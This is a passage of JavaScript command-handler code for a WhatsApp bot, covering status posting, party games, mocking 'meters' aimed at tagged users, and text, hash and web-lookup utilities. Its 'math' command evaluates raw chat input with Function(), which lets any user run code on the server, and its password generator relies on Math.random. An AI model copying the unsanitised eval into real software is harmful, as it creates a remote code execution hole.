            const buf = await baileys.downloadMediaMessage(
                buildMsgObj(m, quoted),
                "buffer",
                {},
                { reuploadRequest: mzazi.updateMediaMessage }
            );
            const content = await baileys.generateWAMessageContent(
                { video: buf, caption: caption || "" },
                { upload: mzazi.waUploadToServer }
            );
            await groupStatus(mzazi, targetGroupId, content);
            return reply(fmt("GROUP STATUS", ["✅ Video status sent!"]));
        }

        // ── AUDIO STATUS ────────────────────────────────────────────────────
        if (quoted.audioMessage) {
            const buf = await baileys.downloadMediaMessage(
                buildMsgObj(m, quoted),
                "buffer",
                {},
                { reuploadRequest: mzazi.updateMediaMessage }
            );
            const vn = await toVN(buf);
            const waveform = await generateWaveform(buf);
            const content = await baileys.generateWAMessageContent(
                {
                    audio: vn,
                    mimetype: "audio/ogg; codecs=opus",
                    ptt: true,
                },
                { upload: mzazi.waUploadToServer }
            );
            if (content.audioMessage) {
                content.audioMessage.waveform = Buffer.from(waveform, "base64");
            }
            await groupStatus(mzazi, targetGroupId, content);
            return reply(fmt("GROUP STATUS", ["✅ Audio status sent!"]));
        }

        return reply(fmt("ERROR", ["❌ Unsupported media type. Reply to image, video, or audio."]));
    } catch (err) {
        logger.error("[togstatus]", err);
        return reply(fmt("ERROR", [`❌ Status error: ${err.message}`]));
    }
    break;
}

//=====================================//

case "downloadfile": {
try {

if (!isOwner) {
return mzazireply("❌ Owner only command");
}

const fs = require("fs");

const filePath = "./case.js";

if (!fs.existsSync(filePath)) {
return mzazireply("❌ case.js file not found");
}

await mzazi.sendMessage(
m.chat,
{
document: fs.readFileSync(filePath),
mimetype: "application/javascript",
fileName: "case.js",
caption:
`📂 *${botName.toUpperCase()} SOURCE FILE*\n\n` +
`✅ Successfully uploaded case.js`
},
{ quoted: m }
);

} catch (e) {

logger.info("DOWNLOADFILE ERROR:", e);

mzazireply(
`❌ Failed to send file\n${e.message}`
);

}
}
break;



      // ═══════════════════════════════════════════════════════
      //  FUN & GAMES COMMANDS
      // ═══════════════════════════════════════════════════════
      
//=====================================//

      case "8ball":
//=====================================//

      case "magic8ball": {
        if (!text) return mzazireply(`🎱 Ask me anything!\nExample: ${prefix}8ball Will I be rich?`);
        const answers8 = ["Yes, definitely! ✅","Without a doubt! ✅","Most likely! ✅","Outlook is good! ✅","Signs point to yes! ✅","Reply hazy, try again 🤔","Ask again later 🤔","Better not tell you now 🤔","Cannot predict now 🤔","Don't count on it ❌","My reply is no ❌","Very doubtful ❌","Outlook not so good ❌","No way! ❌","Absolutely not! ❌"];
        const answer = answers8[Math.floor(Math.random() * answers8.length)];
        mzazireply(`🎱 *MAGIC 8 BALL*\n\n❓ ${text}\n\n${answer}`);
        break;
      }

//=====================================//

      case "coinflip":
//=====================================//

      case "coin":
//=====================================//

      case "flip": {
        const side = Math.random() < 0.5 ? "🪙 HEADS" : "🪙 TAILS";
        mzazireply(`🪙 *COIN FLIP*\n\nResult: *${side}*`);
        break;
      }

//=====================================//

      case "dice":
//=====================================//

      case "roll": {
        const sides = parseInt(args[0]) || 6;
        const result = Math.floor(Math.random() * sides) + 1;
        mzazireply(`🎲 *DICE ROLL* (d${sides})\n\nResult: *${result}*`);
        break;
      }

//=====================================//

      case "rps":
//=====================================//

      case "rockpaperscissors": {
        if (!text) return mzazireply(`✊✋✌️ Choose: rock, paper, or scissors\nExample: ${prefix}rps rock`);
        const choices = ["rock","paper","scissors"];
        const botChoice = choices[Math.floor(Math.random() * 3)];
        const userChoice = text.toLowerCase().trim();
        if (!choices.includes(userChoice)) return mzazireply("❌ Choose: rock, paper, or scissors");
        let result;
        if (userChoice === botChoice) result = "🤝 It's a tie!";
        else if ((userChoice==="rock"&&botChoice==="scissors")||(userChoice==="paper"&&botChoice==="rock")||(userChoice==="scissors"&&botChoice==="paper")) result = "🏆 You win!";
        else result = "💀 Bot wins!";
        const icons = {rock:"✊",paper:"✋",scissors:"✌️"};
        mzazireply(`${icons[userChoice]} vs ${icons[botChoice]}\n\n${result}`);
        break;
      }

//=====================================//

      case "truth": {
        const truths = ["Have you ever lied to your best friend?","What's the most embarrassing thing you've ever done?","Have you ever had a crush on someone in this chat?","What's your biggest fear?","Have you ever cheated on a test?","What's the worst thing you've ever said about someone?","Have you ever stolen something?","What's your most embarrassing moment?","Do you have a secret talent?","What's the biggest mistake you've ever made?","Have you ever pretended to be sick to avoid something?","What is something you've never told anyone?","What's the most childish thing you still do?","Have you ever broken something and blamed someone else?","What is one thing you would change about yourself?"];
        mzazireply(`💬 *TRUTH*\n\n${truths[Math.floor(Math.random() * truths.length)]}`);
        break;
      }

//=====================================//

      case "dare": {
        const dares = ["Sing a song for the next 30 seconds","Do 20 push-ups right now","Text someone a weird message","Send your most recent photo","Change your profile pic for 24 hours","Say the alphabet backwards","Talk in an accent for the next 5 messages","Tell a joke that makes everyone laugh","Do your best impression of a celebrity","Say something nice about every person in this chat","Post a status saying 'I love my mom'","Tell us your most embarrassing childhood memory","Do 10 jumping jacks","Call someone and say 'I know what you did'","Speak only in rhymes for 5 minutes"];
        mzazireply(`🎯 *DARE*\n\n${dares[Math.floor(Math.random() * dares.length)]}`);
        break;
      }

//=====================================//

      case "wouldyourather":
//=====================================//

      case "wyr": {
        const wyrs = ["Would you rather be invisible or be able to fly?","Would you rather have no friends or no family?","Would you rather always be overdressed or always underdressed?","Would you rather lose all your memories or never make new ones?","Would you rather live in the past or the future?","Would you rather be rich and unhappy or poor and happy?","Would you rather be famous or be the best friend of someone famous?","Would you rather know how you'll die or when you'll die?","Would you rather fight 1 horse-sized duck or 100 duck-sized horses?","Would you rather never eat your favorite food again or only eat your favorite food?"];
        mzazireply(`🤔 *WOULD YOU RATHER*\n\n${wyrs[Math.floor(Math.random() * wyrs.length)]}`);
        break;
      }

//=====================================//

      case "nhie":
//=====================================//

      case "neverhaveiever": {
        const nhies = ["Never have I ever gone skydiving","Never have I ever pulled an all-nighter","Never have I ever eaten sushi","Never have I ever traveled abroad","Never have I ever been in a fistfight","Never have I ever broken a bone","Never have I ever stolen something","Never have I ever cheated on an exam","Never have I ever had a crush on a teacher","Never have I ever been to a concert","Never have I ever skinny dipped","Never have I ever gotten a tattoo","Never have I ever driven over the speed limit","Never have I ever cried at a movie","Never have I ever sent a text to the wrong person"];
        mzazireply(`🙋 *NEVER HAVE I EVER*\n\n${nhies[Math.floor(Math.random() * nhies.length)]}`);
        break;
      }

//=====================================//

      case "trivia": {
        const questions = [
          {q:"What is the capital of France?",a:"Paris"},
          {q:"How many continents are there?",a:"7"},
          {q:"What is H2O?",a:"Water"},
          {q:"Who invented the telephone?",a:"Alexander Graham Bell"},
          {q:"What is the largest ocean?",a:"Pacific Ocean"},
          {q:"How many legs does a spider have?",a:"8"},
          {q:"What year did World War 2 end?",a:"1945"},
          {q:"What is the hardest natural substance?",a:"Diamond"},
          {q:"How many planets are in our solar system?",a:"8"},
          {q:"What gas do plants absorb?",a:"Carbon dioxide (CO2)"}
        ];
        const t = questions[Math.floor(Math.random() * questions.length)];
        mzazireply(`🧠 *TRIVIA*\n\n❓ ${t.q}\n\n_Reply with your answer!_\n\n||Answer: ${t.a}||`);
        break;
      }

//=====================================//

      case "riddle": {
        const riddles = [
          {q:"I have hands but can't clap. What am I?",a:"A clock"},
          {q:"I'm tall when young, short when old. What am I?",a:"A candle"},
          {q:"I speak without a mouth and hear without ears. What am I?",a:"An echo"},
          {q:"The more you take, the more you leave behind. What am I?",a:"Footsteps"},
          {q:"What has keys but no locks?",a:"A piano"},
          {q:"I fly without wings. What am I?",a:"Time"},
          {q:"What gets wetter the more it dries?",a:"A towel"},
          {q:"I have cities but no houses. What am I?",a:"A map"},
          {q:"What can travel around the world while staying in one corner?",a:"A stamp"},
          {q:"What has a head and tail but no body?",a:"A coin"}
        ];
        const r = riddles[Math.floor(Math.random() * riddles.length)];
        mzazireply(`🧩 *RIDDLE*\n\n❓ ${r.q}\n\n||Answer: ${r.a}||`);
        break;
      }

//=====================================//

      case "roast": {
        const roasts = ["You're the reason they put instructions on shampoo bottles.","I'd agree with you, but then we'd both be wrong.","You're like a cloud — when you disappear, it's a beautiful day.","Your birth certificate is an apology letter from the hospital.","I'd call you a tool, but that would mean you're useful.","If laughter is the best medicine, your face must be curing diseases.","I've seen better arguments in alphabet soup.","You have your whole life to be an idiot. Why not take today off?","I'd explain it to you, but I don't have crayons handy.","You're proof that evolution can go in reverse."];
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const targetName = target ? `@${jidToNumber(target)}` : "you";
        mzazireply(`🔥 *ROAST*\n\n${targetName}, ${roasts[Math.floor(Math.random() * roasts.length)]}`);
        break;
      }

//=====================================//

      case "compliment": {
        const compliments = ["You are absolutely incredible! 🌟","Your smile could light up the darkest room ✨","You have such an amazing personality! 💫","You make the world a better place just by being in it 🌍","You're one of the most talented people I know 🏆","Your kindness is truly inspiring 💖","You have a heart of gold 🥇","You're more fun than bubble wrap 🎉","You light up every room you walk into 🌟","Your positive energy is contagious! ⚡"];
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const targetName = target ? `@${jidToNumber(target)}` : "you";
        mzazireply(`💝 *COMPLIMENT*\n\n${targetName}, ${compliments[Math.floor(Math.random() * compliments.length)]}`);
        break;
      }

//=====================================//

      case "flirt": {
        const flirts = ["Are you a magician? Because whenever I look at you, everyone else disappears. 😍","Do you have a map? I keep getting lost in your eyes 🗺️","Are you a parking ticket? Because you've got 'fine' written all over you 😏","Is your name Google? Because you have everything I've been searching for 🔍","Do you believe in love at first text? 💬","You must be made of copper and tellurium, because you're CuTe 🧪","If you were a fruit, you'd be a fineapple 🍍","Are you a camera? Every time I look at you, I smile 📸","Are you a star? Because your beauty is out of this world ⭐","I was going to tell you a joke about time travel, but you looked great. 😅"];
        mzazireply(`💕 *FLIRT*\n\n${flirts[Math.floor(Math.random() * flirts.length)]}`);
        break;
      }

//=====================================//

      case "ship":
//=====================================//

      case "lovemeter":
//=====================================//

      case "lovestats": {
        const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (mentioned.length < 2) return mzazireply(`💕 Mention 2 users!\nExample: ${prefix}ship @user1 @user2`);
        const p1 = jidToNumber(mentioned[0]);
        const p2 = jidToNumber(mentioned[1]);
        const score = Math.floor(Math.random() * 101);
        let heart = score >= 80 ? "❤️❤️❤️" : score >= 50 ? "💛💛" : "💔";
        mzazireply(`💕 *LOVE METER*\n\n@${p1} + @${p2}\n\n💘 Compatibility: ${score}%\n${"█".repeat(Math.floor(score/10))}${"░".repeat(10 - Math.floor(score/10))} ${score}%\n\n${heart}`);
        break;
      }

//=====================================//

      case "howgay":
//=====================================//

      case "gay": {
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const name = target ? `@${jidToNumber(target)}` : senderNum;
        const score = Math.floor(Math.random() * 101);
        mzazireply(`🏳️‍🌈 *GAY METER*\n\n${name} is ${score}% gay\n${"█".repeat(Math.floor(score/10))}${"░".repeat(10-Math.floor(score/10))} ${score}%`);
        break;
      }

//=====================================//

      case "howstupid":
//=====================================//

      case "stupid": {
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const name = target ? `@${jidToNumber(target)}` : senderNum;
        const score = Math.floor(Math.random() * 101);
        mzazireply(`🤪 *STUPID METER*\n\n${name} is ${score}% stupid\n${"█".repeat(Math.floor(score/10))}${"░".repeat(10-Math.floor(score/10))} ${score}%`);
        break;
      }

//=====================================//

      case "howrich":
//=====================================//

      case "rich": {
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const name = target ? `@${jidToNumber(target)}` : senderNum;
        const score = Math.floor(Math.random() * 101);
        mzazireply(`💰 *RICH METER*\n\n${name} is ${score}% rich\n${"█".repeat(Math.floor(score/10))}${"░".repeat(10-Math.floor(score/10))} ${score}%`);
        break;
      }

//=====================================//

      case "iq": {
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const name = target ? `@${jidToNumber(target)}` : senderNum;
        const score = Math.floor(Math.random() * 201);
        mzazireply(`🧠 *IQ METER*\n\n${name}'s IQ: ${score}\n${score >= 140 ? "Genius! 🏆" : score >= 110 ? "Above average 🌟" : score >= 90 ? "Average 😐" : "Below average 💔"}`);
        break;
      }

//=====================================//

      case "howugly":
//=====================================//

      case "ugly": {
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const name = target ? `@${jidToNumber(target)}` : senderNum;
        const score = Math.floor(Math.random() * 101);
        mzazireply(`😬 *UGLY METER*\n\n${name} is ${score}% ugly\n${"█".repeat(Math.floor(score/10))}${"░".repeat(10-Math.floor(score/10))} ${score}%`);
        break;
      }

//=====================================//

      case "howcute":
//=====================================//

      case "cute": {
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const name = target ? `@${jidToNumber(target)}` : senderNum;
        const score = Math.floor(Math.random() * 101);
        mzazireply(`🥰 *CUTE METER*\n\n${name} is ${score}% cute\n${"█".repeat(Math.floor(score/10))}${"░".repeat(10-Math.floor(score/10))} ${score}%`);
        break;
      }

//=====================================//

      case "rng":
//=====================================//

      case "random": {
        const parts = text.split("-").map(Number);
        const min = parts[0] || 1;
        const max = parts[1] || 100;
        if (isNaN(min) || isNaN(max)) return mzazireply(`Example: ${prefix}rng 1-100`);
        const num = Math.floor(Math.random() * (max - min + 1)) + min;
        mzazireply(`🎰 *RANDOM NUMBER*\n\nRange: ${min} - ${max}\nResult: *${num}*`);
        break;
      }

//=====================================//

      case "choose":
//=====================================//

      case "pick": {
        if (!text) return mzazireply(`Example: ${prefix}choose option1, option2, option3`);
        const options = text.split(",").map(o => o.trim()).filter(Boolean);
        if (options.length < 2) return mzazireply("Give at least 2 options separated by commas!");
        const chosen = options[Math.floor(Math.random() * options.length)];
        mzazireply(`🎯 *DECISION MAKER*\n\n${options.map((o,i)=>`${i+1}. ${o}`).join("\n")}\n\n✅ I choose: *${chosen}*`);
        break;
      }

//=====================================//

      case "countdown": {
        if (!text || isNaN(parseInt(text))) return mzazireply(`Example: ${prefix}countdown 10`);
        let count = Math.min(parseInt(text), 30);
        let countStr = "";
        for (let i = count; i >= 0; i--) countStr += `${i}... `;
        mzazireply(`⏱️ *COUNTDOWN*\n\n${countStr.trim()}\n\n🎉 Done!`);
        break;
      }

//=====================================//

      case "rate":
//=====================================//

      case "rateme": {
        const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const name = target ? `@${jidToNumber(target)}` : senderNum;
        const score = Math.floor(Math.random() * 10) + 1;
        const stars = "⭐".repeat(score) + "☆".repeat(10-score);
        mzazireply(`⭐ *RATE*\n\n${name} rated: ${score}/10\n${stars}`);
        break;
      }

      // ═══════════════════════════════════════════════════════
      //  UTILITY TOOLS COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "time": {
        const now = new Date();
        const utc = now.toUTCString();
        const local = now.toLocaleString();
        mzazireply(`🕐 *CURRENT TIME*\n\n🌍 UTC: ${utc}\n🏠 Local: ${local}\n⏱️ Timestamp: ${now.getTime()}`);
        break;
      }

//=====================================//

      case "date": {
        const d = new Date();
        const options = { weekday:"long", year:"numeric", month:"long", day:"numeric" };
        mzazireply(`📅 *TODAY'S DATE*\n\n${d.toLocaleDateString("en-US", options)}\n📆 Week ${Math.ceil(d.getDate()/7)} of ${d.toLocaleString("default",{month:"long"})}`);
        break;
      }

//=====================================//

      case "base64encode":
//=====================================//

      case "b64encode": {
        if (!text) return mzazireply(`Example: ${prefix}b64encode Hello World`);
        mzazireply(`🔐 *BASE64 ENCODE*\n\nInput: ${text}\nOutput:\n${Buffer.from(text).toString("base64")}`);
        break;
      }

//=====================================//

      case "base64decode":
//=====================================//

      case "b64decode": {
        if (!text) return mzazireply(`Example: ${prefix}b64decode SGVsbG8gV29ybGQ=`);
        try {
          const decoded = Buffer.from(text, "base64").toString("utf8");
          mzazireply(`🔓 *BASE64 DECODE*\n\nInput: ${text}\nOutput:\n${decoded}`);
        } catch(e) { mzazireply("❌ Invalid base64 string"); }
        break;
      }

//=====================================//

      case "hex":
//=====================================//

      case "tohex": {
        if (!text) return mzazireply(`Example: ${prefix}hex Hello`);
        const hexResult = Buffer.from(text).toString("hex");
        mzazireply(`🔢 *HEX ENCODE*\n\nInput: ${text}\nOutput: ${hexResult}`);
        break;
      }

//=====================================//

      case "unhex":
//=====================================//

      case "fromhex": {
        if (!text) return mzazireply(`Example: ${prefix}unhex 48656c6c6f`);
        try {
          const result2 = Buffer.from(text.replace(/\s/g,""), "hex").toString("utf8");
          mzazireply(`🔡 *HEX DECODE*\n\nInput: ${text}\nOutput: ${result2}`);
        } catch(e) { mzazireply("❌ Invalid hex string"); }
        break;
      }

//=====================================//

      case "binary":
//=====================================//

      case "tobin": {
        if (!text) return mzazireply(`Example: ${prefix}binary Hello`);
        const binResult = text.split("").map(c => c.charCodeAt(0).toString(2).padStart(8,"0")).join(" ");
        mzazireply(`🔢 *BINARY ENCODE*\n\nInput: ${text}\nOutput:\n${binResult}`);
        break;
      }

//=====================================//

      case "frombin":
//=====================================//

      case "undbin": {
        if (!text) return mzazireply(`Example: ${prefix}frombin 01001000 01100101 01101100 01101100 01101111`);
        try {
          const result3 = text.trim().split(/\s+/).map(b => String.fromCharCode(parseInt(b,2))).join("");
          mzazireply(`🔡 *BINARY DECODE*\n\nOutput: ${result3}`);
        } catch(e) { mzazireply("❌ Invalid binary"); }
        break;
      }

//=====================================//

      case "ascii": {
        if (!text) return mzazireply(`Example: ${prefix}ascii Hello`);
        const asciiResult = text.split("").map(c => c.charCodeAt(0)).join(" ");
        mzazireply(`🔢 *ASCII CODES*\n\nText: ${text}\nCodes: ${asciiResult}`);
        break;
      }

//=====================================//

      case "md5": {
        if (!text) return mzazireply(`Example: ${prefix}md5 hello`);
        const hash = crypto.createHash("md5").update(text).digest("hex");
        mzazireply(`🔐 *MD5 HASH*\n\nInput: ${text}\nHash: ${hash}`);
        break;
      }

//=====================================//

      case "sha1": {
        if (!text) return mzazireply(`Example: ${prefix}sha1 hello`);
        const sha1hash = crypto.createHash("sha1").update(text).digest("hex");
        mzazireply(`🔐 *SHA1 HASH*\n\nInput: ${text}\nHash: ${sha1hash}`);
        break;
      }

//=====================================//

      case "sha256": {
        if (!text) return mzazireply(`Example: ${prefix}sha256 hello`);
        const sha256hash = crypto.createHash("sha256").update(text).digest("hex");
        mzazireply(`🔐 *SHA256 HASH*\n\nInput: ${text}\nHash: ${sha256hash}`);
        break;
      }

//=====================================//

      case "password":
//=====================================//

      case "genpass":
//=====================================//

      case "passgen": {
        const len = parseInt(args[0]) || 16;
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=";
        let pass = "";
        for (let i=0; i<Math.min(len,64); i++) pass += chars[Math.floor(Math.random()*chars.length)];
        mzazireply(`🔐 *PASSWORD GENERATOR*\n\nLength: ${len}\nPassword:\n\`${pass}\``);
        break;
      }

//=====================================//

      case "uuid":
//=====================================//

      case "uid": {
        const uuidVal = `${crypto.randomBytes(4).toString("hex")}-${crypto.randomBytes(2).toString("hex")}-4${crypto.randomBytes(1).toString("hex").slice(1)}-${["8","9","a","b"][Math.floor(Math.random()*4)]}${crypto.randomBytes(1).toString("hex").slice(1)}-${crypto.randomBytes(6).toString("hex")}`;
        mzazireply(`🆔 *UUID GENERATOR*\n\n\`${uuidVal}\``);
        break;
      }

//=====================================//

      case "char":
//=====================================//

      case "charcount": {
        if (!text) return mzazireply(`Example: ${prefix}char Hello World`);
        const wCount = text.trim().split(/\s+/).length;
        const cCount = text.length;
        const noBlanks = text.replace(/\s/g,"").length;
        mzazireply(`📊 *CHARACTER COUNT*\n\nText: ${text}\n\n🔤 Characters (with spaces): ${cCount}\n🔤 Characters (no spaces): ${noBlanks}\n📝 Words: ${wCount}\n📄 Lines: ${text.split("\n").length}`);
        break;
      }

//=====================================//

      case "reverse":
//=====================================//

      case "rev": {
        if (!text) return mzazireply(`Example: ${prefix}reverse Hello World`);
        mzazireply(`🔄 *REVERSE TEXT*\n\nInput: ${text}\nOutput: ${text.split("").reverse().join("")}`);
        break;
      }

//=====================================//

      case "uppercase":
//=====================================//

      case "upper":
//=====================================//

      case "caps": {
        if (!text) return mzazireply(`Example: ${prefix}upper hello world`);
        mzazireply(`⬆️ *UPPERCASE*\n\n${text.toUpperCase()}`);
        break;
      }

//=====================================//

      case "lowercase":
//=====================================//

      case "lower": {
        if (!text) return mzazireply(`Example: ${prefix}lower HELLO WORLD`);
        mzazireply(`⬇️ *LOWERCASE*\n\n${text.toLowerCase()}`);
        break;
      }

//=====================================//

      case "repeat":
//=====================================//

      case "spam": {
        if (!text) return mzazireply(`Example: ${prefix}repeat 3 Hello`);
        const times = parseInt(args[0]) || 3;
        const msg = args.slice(1).join(" ") || text;
        if (times > 20) return mzazireply("❌ Max 20 times");
        mzazireply(Array(Math.min(times,20)).fill(msg).join("\n"));
        break;
      }

//=====================================//

      case "mocktext":
//=====================================//

      case "spongebob": {
        if (!text) return mzazireply(`Example: ${prefix}mocktext hello world`);
        const mocked = text.split("").map((c,i) => i%2===0 ? c.toUpperCase() : c.toLowerCase()).join("");
        mzazireply(`🧽 *MOCKING SPONGEBOB*\n\n${mocked}`);
        break;
      }

//=====================================//

      case "zalgo": {
        if (!text) return mzazireply(`Example: ${prefix}zalgo hello`);
        const zalgoChars = ["̴","̵","̶","̷","̸","̡","̢","̧","̨"];
        const result4 = text.split("").map(c => c + zalgoChars.slice(0,Math.floor(Math.random()*3)).join("")).join("");
        mzazireply(`👾 *ZALGO TEXT*\n\n${result4}`);
        break;
      }

//=====================================//

      case "clap": {
        if (!text) return mzazireply(`Example: ${prefix}clap this is amazing`);
        mzazireply(`👏 ${text.split(" ").join(" 👏 ")} 👏`);
        break;
      }

//=====================================//

      case "vaporwave":
//=====================================//

      case "aesthetic": {
        if (!text) return mzazireply(`Example: ${prefix}vaporwave hello`);
        const vaporResult = text.split("").map(c => {
          const code = c.charCodeAt(0);
          if (code >= 33 && code <= 126) return String.fromCharCode(code + 65248);
          return c === " " ? "　" : c;
        }).join("");
        mzazireply(`💠 *AESTHETIC TEXT*\n\n${vaporResult}`);
        break;
      }

//=====================================//

      case "morse":
//=====================================//

      case "morseencode": {
        if (!text) return mzazireply(`Example: ${prefix}morse SOS`);
        const morseMap = {a:".-",b:"-...",c:"-.-.",d:"-..",e:".",f:"..-.",g:"--.",h:"....",i:"..",j:".---",k:"-.-",l:".-..",m:"--",n:"-.",o:"---",p:".--.",q:"--.-",r:".-.",s:"...",t:"-",u:"..-",v:"...-",w:".--",x:"-..-",y:"-.--",z:"--.."," ":"/"};
        const encoded = text.toLowerCase().split("").map(c => morseMap[c] || c).join(" ");
        mzazireply(`📡 *MORSE CODE*\n\nInput: ${text}\nOutput: ${encoded}`);
        break;
      }

//=====================================//

      case "unmorse":
//=====================================//

      case "morsedecode": {
        if (!text) return mzazireply(`Example: ${prefix}unmorse ... --- ...`);
        const morseToLetter = {".-..-":"\"",".-..-.":"\"",".-": "a","-...":"b","-.-.":"c","-..":"d",".":"e","..-.":"f","--.":"g","....":"h","..":"i",".---":"j","-.-":"k",".-..":"l","--":"m","-.":"n","---":"o",".--.":"p","--.-":"q",".-.":"r","...":"s","-":"t","..-":"u","...-":"v",".--":"w","-..-":"x","-.--":"y","--..":"z","/": " "};
        const decoded2 = text.split(" ").map(c => morseToLetter[c] || c).join("");
        mzazireply(`📡 *MORSE DECODE*\n\nInput: ${text}\nOutput: ${decoded2.toUpperCase()}`);
        break;
      }

//=====================================//

      case "matheval":
//=====================================//

      case "math": {
        if (!text) return mzazireply(`Example: ${prefix}math 5+5*2`);
        try {
          const mathResult = Function(`"use strict"; return (${text})`)();
          mzazireply(`🧮 *MATH*\n\n${text} = *${mathResult}*`);
        } catch(e) { mzazireply(`❌ Invalid expression: ${text}`); }
        break;
      }

//=====================================//

      case "color": {
        if (!text) return mzazireply(`Example: ${prefix}color #FF5733 or ${prefix}color red`);
        const colorUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(text)}&bgcolor=${text.replace("#","")}&color=ffffff`;
        mzazireply(`🎨 *COLOR INFO*\n\nColor: ${text}\nPreview: ${colorUrl}`);
        break;
      }

//=====================================//

      case "shorturl":
//=====================================//

      case "shorten": {
        if (!text) return mzazireply(`Example: ${prefix}shorturl https://example.com`);
        try {
          const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`);
          const short = await res.text();
          mzazireply(`🔗 *URL SHORTENER*\n\nOriginal: ${text}\nShort: ${short}`);
        } catch(e) { mzazireply("❌ Failed to shorten URL"); }
        break;
      }

//=====================================//

      case "ip":
//=====================================//

      case "myip": {
        try {
          const ipRes = await fetch("https://api.ipify.org?format=json");
          const ipData = await ipRes.json();
          mzazireply(`🌐 *IP ADDRESS*\n\nServer IP: ${ipData.ip}`);
        } catch(e) { mzazireply("❌ Failed to get IP"); }
        break;
      }

//=====================================//

      case "ipinfo": {
        if (!text) return mzazireply(`Example: ${prefix}ipinfo 8.8.8.8`);
        try {
          const ipRes2 = await fetch(`http://ip-api.com/json/${text}`);
          const ipData2 = await ipRes2.json();
          mzazireply(`🌐 *IP INFO*\n\n🔢 IP: ${ipData2.query}\n🌍 Country: ${ipData2.country}\n🏙️ City: ${ipData2.city}\n📮 ZIP: ${ipData2.zip}\n🌐 ISP: ${ipData2.isp}\n📍 Lat/Lon: ${ipData2.lat}, ${ipData2.lon}`);
        } catch(e) { mzazireply("❌ Failed to get IP info"); }
        break;
      }

//=====================================//

      case "currency":
//=====================================//

      case "convert": {
        if (!text) return mzazireply(`Example: ${prefix}currency 100 USD to KES`);
        try {
          const parts2 = text.match(/(\d+\.?\d*)\s+([A-Z]{3})\s+to\s+([A-Z]{3})/i);
          if (!parts2) return mzazireply(`Format: ${prefix}currency 100 USD to KES`);
          const [, amount, from, to] = parts2;
          const rateRes = await fetch(`https://api.exchangerate-api.com/v4/latest/${from.toUpperCase()}`);
          const rateData = await rateRes.json();
          const rate = rateData.rates[to.toUpperCase()];
          if (!rate) return mzazireply(`❌ Unknown currency: ${to}`);
          const converted = (parseFloat(amount) * rate).toFixed(2);
          mzazireply(`💱 *CURRENCY CONVERTER*\n\n${amount} ${from.toUpperCase()} = *${converted} ${to.toUpperCase()}*\nRate: 1 ${from} = ${rate} ${to}`);
        } catch(e) { mzazireply("❌ Currency conversion failed"); }
        break;
      }

//=====================================//

      case "crypto": {
        if (!text) return mzazireply(`Example: ${prefix}crypto bitcoin`);
        try {
          const cryptoRes = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(text.toLowerCase())}&vs_currencies=usd,kes&include_24hr_change=true`);
          const cryptoData = await cryptoRes.json();
          const coin = cryptoData[text.toLowerCase()];
          if (!coin) return mzazireply(`❌ Coin not found: ${text}\nTry: bitcoin, ethereum, solana, binancecoin`);
          const change = coin.usd_24h_change?.toFixed(2);
          const changeIcon = change > 0 ? "📈" : "📉";
          mzazireply(`₿ *CRYPTO PRICE*\n\n🪙 Coin: ${text.toUpperCase()}\n💵 USD: $${coin.usd?.toLocaleString()}\n🇰🇪 KES: KES ${coin.kes?.toLocaleString()}\n${changeIcon} 24h Change: ${change}%`);
        } catch(e) { mzazireply("❌ Failed to get crypto price"); }
        break;
      }

//=====================================//

      case "wiki":
//=====================================//

      case "wikipedia": {
        if (!text) return mzazireply(`Example: ${prefix}wiki Albert Einstein`);
        try {
          const wikiRes = await fetch(`https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(text)}`);
          const wikiData = await wikiRes.json();
          if (wikiData.type === "disambiguation" || !wikiData.extract) return mzazireply(`❌ No result for: ${text}`);
          const extract = wikiData.extract.slice(0,800);
          mzazireply(`📚 *WIKIPEDIA*\n\n*${wikiData.title}*\n\n${extract}...\n\n🔗 ${wikiData.content_urls?.desktop?.page || ""}`);
        } catch(e) { mzazireply("❌ Wikipedia lookup failed"); }
        break;
      }

//=====================================//

      case "definition":
//=====================================//

      case "dict":
//=====================================//

      case "dictionary": {
        if (!text) return mzazireply(`Example: ${prefix}dict serendipity`);
        try {
          const dictRes = await fetch(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`);
          const dictData = await dictRes.json();
          if (!Array.isArray(dictData)) return mzazireply(`❌ Word not found: ${text}`);
          const entry = dictData[0];
          const meanings = entry.meanings.slice(0,3).map(m2 => `\n*${m2.partOfSpeech}*: ${m2.definitions[0].definition}`).join("\n");
          const phonetic = entry.phonetics?.[0]?.text || "";
          mzazireply(`📖 *DICTIONARY*\n\n📝 Word: *${entry.word}*\n🔊 ${phonetic}\n${meanings}`);
        } catch(e) { mzazireply("❌ Dictionary lookup failed"); }
        break;
      }

//=====================================//

      case "synonym":
//=====================================//

      case "thesaurus": {
        if (!text) return mzazireply(`Example: ${prefix}synonym happy`);
        try {
          const synRes = await fetch(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`);
          const synData = await synRes.json();
          if (!Array.isArray(synData)) return mzazireply(`❌ Word not found: ${text}`);
          const synonyms = synData[0].meanings.flatMap(m2 => m2.definitions.flatMap(d => d.synonyms || [])).slice(0,20);
          const antonyms = synData[0].meanings.flatMap(m2 => m2.definitions.flatMap(d => d.antonyms || [])).slice(0,10);
          mzazireply(`📖 *THESAURUS*\n\n📝 Word: *${text}*\n\n✅ Synonyms:\n${synonyms.join(", ") || "None found"}\n\n❌ Antonyms:\n${antonyms.join(", ") || "None found"}`);
        } catch(e) { mzazireply("❌ Thesaurus lookup failed"); }
        break;
      }

//=====================================//

